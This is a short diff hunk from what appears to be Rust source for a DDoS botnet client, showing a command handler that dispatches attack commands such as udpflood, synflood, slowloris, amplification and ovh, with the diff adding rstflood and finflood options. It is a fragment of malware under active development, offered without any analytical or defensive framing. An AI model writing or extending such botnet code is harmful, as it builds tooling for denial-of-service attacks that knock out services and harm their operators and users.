@@ -223,7 +223,7 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
     let cmd = fields[0];
     match cmd {
         "!udpflood" | "!udpsmart" | "!tcpflood" | "!synflood" | 
-        "!ackflood" | "!greflood" | "!dns" | "!dnsl4" | "!http" |
+        "!ackflood" | "!rstflood" | "!finflood" | "!greflood" | "!dns" | "!dnsl4" | "!http" |
         "!slowloris" | "!sslflood" | "!websocket" | "!icmpflood" |
         "!amplification" | "!connection" |
         "!vse" | "!ovh" | "!ua" | "!stress" |
